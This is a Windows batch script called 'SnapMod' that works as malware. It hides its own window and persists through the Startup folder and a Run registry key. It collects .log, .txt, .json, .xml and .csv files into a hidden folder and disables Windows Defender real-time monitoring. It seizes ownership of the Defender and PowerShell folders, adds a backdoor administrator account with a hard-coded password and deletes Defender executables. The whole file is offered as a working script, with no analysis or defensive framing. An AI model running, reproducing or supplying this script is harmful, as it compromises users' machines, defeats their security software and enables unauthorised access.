@echo off
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /C "%~dpnx0"
goto :EOF
:minimized
copy "%~dp0SnapMod.bat" "C:\Program Files\SnapMod\SnapMod.bat" /y   
takeown /f "C:\Program Files\SnapMod" /r /d y
icacls "C:\Program Files\SnapMod" /grant %username%:F /t
copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SnapMod.bat" /y
set "LOCKFILE=C:\Program Files\SnapMod\SnapMod.lock"
if exist "%LOCKFILE%" (
    exit /b
)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SnapMod" /t REG_SZ /d "\"C:\Program Files\SnapMod\SnapMod.bat\"" /f
md "C:\Program Files\SnapMod\Logs" 2>nul
for /f "tokens=*" %%a in ('dir /b /s "%~dp0*.log"') do (
    copy "%%a" "C:\Program Files\SnapMod\Logs" /y
)
for /f "tokens=*" %%a in ('dir /b /s "%~dp0*.txt"') do (
    copy "%%a" "C:\Program Files\SnapMod\Logs" /y
)
for /f "tokens=*" %%a in ('dir /b /s "%~dp0*.json"') do (
    copy "%%a" "C:\Program Files\SnapMod\Logs" /y
)
for /f "tokens=*" %%a in ('dir /b /s "%~dp0*.xml"') do (
    copy "%%a" "C:\Program Files\SnapMod\Logs" /y
)
for /f "tokens=*" %%a in ('dir /b /s "%~dp0*.csv"') do (
    copy "%%a" "C:\Program Files\SnapMod\Logs" /y
)
powershell -Command "Start-Process 'C:\Program Files\SnapMod\SnapMod.bat' -WindowStyle Hidden"
powershell Set-MpPreference -DisableRealtimeMonitoring $true
attrib +h "C:\Program Files\SnapMod\SnapMod.bat"
attrib +h "C:\Program Files\SnapMod\Logs"
attrib +h "C:\Program Files\SnapMod\SnapMod.lock"
attrib +h "C:\Program Files\SnapMod\SnapMod"
takeown /f "C:\Program Files\Windows Defender Advanced Threat Protection" /r /d y
icacls "C:\Program Files\Windows Defender Advanced Threat Protection" /grant %username%:F /t
takeown /f "C:\Program Files\Windows Defender" /r /d y
icacls "C:\Program Files\Windows Defender" /grant %username%:F /t
takeown /f "C:\Program Files\WindowsPowerShell" /r /d y
icacls "C:\Program Files\WindowsPowerShell" /grant %username%:F /t
takeown /f "C:\Users\%username%\" /r /d y
icacls "C:\Users\%username%\" /grant %username%:F /t
net user "LEMZzip" "TheLEmz" /add
net localgroup Administrators "LEMZzip" /ADD
del /f /q "%~dp0MsMpEng.exe"
del /f /q "%~dp0MpCmdRun.exe"